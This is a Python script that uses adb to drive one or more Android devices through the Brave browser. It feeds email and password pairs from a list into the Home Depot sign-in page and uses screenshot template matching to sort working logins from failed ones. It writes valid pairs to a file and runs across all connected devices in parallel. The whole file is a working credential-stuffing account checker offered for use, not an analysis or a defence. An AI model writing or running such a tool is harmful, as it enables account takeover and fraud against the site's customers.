import os,time
try:
 import threading,subprocess,base64,cv2,random
 import numpy as np
except:
  os.system("pip install --force-reinstall --no-cache opencv-python==4.5.5.64")
  os.system("pip install numpy")
import threading,subprocess,base64,cv2,sys
import numpy as np

class Auto:
    def __init__(self,handle):
        self.handle = handle
    def screen_capture(self,x1,y1,x2,y2):
        #os.system(f'adb -s {self.handle} exec-out screencap -p > {name}.png')
        pipe = subprocess.Popen(f'adb -s {self.handle} exec-out screencap -p',
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, shell=True)
        #image_bytes = pipe.stdout.read().replace(b'\r\n', b'\n')
        image_bytes = pipe.stdout.read()
        image = cv2.imdecode(np.fromstring(image_bytes, np.uint8), cv2.IMREAD_COLOR)
        x = x1
        y = y1
        w = x2-x1
        h = y2-y1
        im = image[y:y+h,x:x+w]
        #cv2.imshow("test",im)
        #cv2.waitKey(0)
        #cv2.destroyWindow("test")
        return im
    def click(self,x,y):
        os.system(f'adb -s {self.handle} shell input tap {x} {y}')
    def swipe(self, x1, y1, x2, y2):
        os.system(f"adb -s {self.handle} shell input touchscreen swipe {x1} {y1} {x2} {y2} 1000")
    def DeleteCache(self, package):
        subprocess.check_output(f"adb -s {self.handle} shell pm clear {package}")
        os.system(f"adb -s {self.handle} shell input keyevent 3")
    def InpuText(self, text=None, VN=None):
        if text == None:
            text =  str(base64.b64encode(VN.encode('utf-8')))[1:]
            os.system(f"adb -s {self.handle} shell ime set com.android.adbkeyboard/.AdbIME")
            os.system(f"adb -s {self.handle} shell am broadcast -a ADB_INPUT_B64 --es msg {text}")
            return
        os.system(f"adb -s {self.handle} shell input text '{text}'")
    def Home(self):
        os.system(f"adb -s {self.handle} shell input text 'https://www.homedepot.com/auth/view/signin?redirect='")
    def find2(self,img='',template_pic_name=False):
        if template_pic_name == False:
            self.screen_capture(self.handle)
            template_pic_name = self.handle
        else:
            self.screen_capture(template_pic_name)
        img = cv2.imread(img)
        img2 = cv2.imread(template_pic_name)
        result = cv2.matchTemplate(img,img2,cv2.TM_CCOEFF_NORMED)
        loc = np.where(result >= 0.99)
        test_data = list(zip(*loc[::-1]))
        return test_data
    def find(self,x1,y1,x2,y2,img='',threshold=0.99):
        img = cv2.imread(img) #sys.path[0]+"/"+img)
        img2 = self.screen_capture(x1,y1,x2,y2)    
        result = cv2.matchTemplate(img,img2,cv2.TM_CCOEFF_NORMED)
        loc = np.where(result >= threshold)
        retVal = list(zip(*loc[::-1]))
        #image = cv2.rectangle(img2, retVal[0],(retVal[0][0]+img.shape[0],retVal[0][1]+img.shape[1]), (0,250,0), 2)
        #cv2.imshow("test",image)
        #cv2.waitKey(0)
        #cv2.destroyWindow("test")
        return retVal

def GetDevices():
        devices = subprocess.check_output("adb devices")
        p = str(devices).replace("b'List of devices attached","").replace('\\r\\n',"").replace(" ","").replace("'","").replace('b*daemonnotrunning.startingitnowonport5037**daemonstartedsuccessfully*Listofdevicesattached',"")
        if len(p) > 0:
            listDevices = p.split("\\tdevice")
            listDevices.pop()
            return listDevices
        else:
            return 0
GetDevices()
thread_count = len(GetDevices())
tk = open("tk.txt").readlines()
class starts(threading.Thread):
    def __init__(self, nameLD,file, i):
        super().__init__()
        self.nameLD = nameLD
        self.file = file
        self.device = i
    def run(self):
        email = self.file.split("|")[0]
        pwd = self.file.split("|")[1]
        #i = self.index
        device = self.device
        d = Auto(device)
        d.DeleteCache("com.brave.browser")
        def step1(d):
            c = 0
            while True:
                c += 1
                try:
                    poin  = d.find(170,389,253,472,'img\\1.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+170,poin[0][1]+389)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Run Brave")
                        step2(d)
                        break
                    if c == 20:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step2(d)
                        break
                except:
                    return 0
        def step2(d):
            c = 0
            while True:
                c += 1
                try:
                    poin  = d.find(81,397,447,485,'img\\2.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+81,poin[0][1]+397)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Click Continue")
                        step21(d)
                        break
                    if c == 40:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step21(d)
                        break
                except:
                    return 0
        def step21(d):
            c = 0
            while True:
                c += 1
                try:
                    poin  = d.find(92,464,445,534,'img\\2.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+92,poin[0][1]+464)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Click Continue")
                    poin2  = d.find(110,222,242,375,'img\\3.png')
                    if poin2 > [(0, 0)] :
                        d.click(153,84)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Nhap Link Homep")
                        d.Home()
                        time.sleep(2)
                        d.click(278,162)
                        step3(d)
                        break
                    if c == 40:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        d.DeleteCache("com.brave.browser")
                        step1(d)
                        break
                except:
                    return 0
        def step3(d):
            c = 0
            while True:
                c += 1
                try:
                    poin2  = d.find(401,633,492,701,'img\\4.png')
                    if poin2 > [(0, 0)] :
                        d.click(poin2[0][0]+401,poin2[0][1]+633)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Click Allow")
                    poin  = d.find(356,506,461,589,'img\\5.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+356,poin[0][1]+506)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Click Allow")
                        step4(d)
                        break
                    if c == 20:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step5(d)
                        break
                except:
                    return 0
        def step4(d):
            c = 0
            while True:
                c += 1
                try:
                    poin2  = d.find(198,578,349,651,'img\\6.png')
                    if poin2 > [(0, 0)] :
                        d.click(84.7,532.7)
                        time.sleep(2)
                        d.InpuText(email)
                        time.sleep(2)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Nhap Gamil [",email,"]")
                    poin  = d.find(198,578,349,651,'img\\7.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+198,poin[0][1]+578)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Continue")
                        step5(d)
                        break
                    if c == 20:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step5(d)
                        break
                except:
                    return 0
        def step5(d):
            c = 0
            while True:
                c += 1
                try:
                    poin3  = d.find(73,241,456,298,'img\\13.png')
                    if poin3 > [(0, 0)] :
                        d.DeleteCache("com.brave.browser")
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Sai")
                        break
                    poin5  = d.find(135,479,193,540,'img\\19.png')
                    if poin5 > [(0, 0)] :
                        d.DeleteCache("com.brave.browser")
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Sai")
                        break
                    poin4  = d.find(11,391,71,454,'img\\12.png')
                    if poin4 > [(0, 0)] :
                        d.DeleteCache("com.brave.browser")
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Sai")
                        break
                    poin2  = d.find(200,623,349,683,'img\\8.png')
                    if poin2 > [(0, 0)] :
                        d.click(53,440)
                        time.sleep(2)
                        d.InpuText(pwd)
                        time.sleep(1)
                        d.click(44.1,565.2)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Nhap Pass [",pwd,"]")
                    poin  = d.find(200,623,349,683,'img\\9.png')
                    if poin > [(0, 0)] :
                        d.click(poin[0][0]+200,poin[0][1]+623)
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Gign In")
                        step6(d)
                        break
                    if c == 20:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step6(d)
                        break
                except:
                    return 0
        def step6(d):
            c = 0
            while True:
                c += 1
                try:
                    poin5  = d.find(3,120,141,202,'img\\18.png')
                    if poin5 > [(0, 0)] :
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Dung [",email,"]")
                        with open('valude.txt', 'a') as f:
                            f.write("{}|{}|\n".format(email, pwd))
                            f.close()
                        d.DeleteCache("com.brave.browser")
                        break
                    #poin6  = d.find('img\\17.png')
                    #if poin6 > [(0, 0)] :
                        #print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Dung [",email,"]")
                        #with open('valude.txt', 'a') as f:
                            #f.write("{}|{}|\n".format(email, pwd))
                            #f.close()
                        #d.DeleteCache("com.brave.browser")
                        #break
                    poin4  = d.find(3,183,144,267,'img\\15.png')
                    if poin4 > [(0, 0)] :
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Dung [",email,"]")
                        with open('valude.txt', 'a') as f:
                            f.write("{}|{}|\n".format(email, pwd))
                            f.close()
                        d.DeleteCache("com.brave.browser")
                        break
                    poin3  = d.find(182,584,354,638,'img\\14.png')
                    if poin3 > [(0, 0)] :
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Dung [",email,"]")
                        with open('valude.txt', 'a') as f:
                            f.write("{}|{}|\n".format(email, pwd))
                            f.close()
                        d.DeleteCache("com.brave.browser")
                        break
                    poin2  = d.find(182,706,352,766,'img\\20.png')
                    if poin2 > [(0, 0)] :
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Dung [",email,"]")
                        with open('valude.txt', 'a') as f:
                            f.write("{}|{}|\n".format(email, pwd))
                            f.close()
                        d.DeleteCache("com.brave.browser")
                        break
                    poin7  = d.find(135,479,193,540,'img\\19.png')
                    if poin7 > [(0, 0)] :
                        d.DeleteCache("com.brave.browser")
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Sai")
                        break
                    poin  = d.find(18,362,65,404,'img\\12.png')
                    if poin > [(0, 0)] :
                        d.DeleteCache("com.brave.browser")
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Acc Sai")
                        break
                    if c == 40:
                        print(" \033[1;31m |\033[1;37m[",self.nameLD,"]\033[1;31m Thot loi")
                        step1(d)
                        break
                except:
                    return 0
        step1(d)

def main(m):
        device = GetDevices()[m]
        for i in range(m, len(tk), thread_count):
                mail = tk[i].strip()
                run = starts(device,mail, device,)
                run.run()

for m in range(thread_count):
    threading.Thread(target=main, args=(m,)).start()
        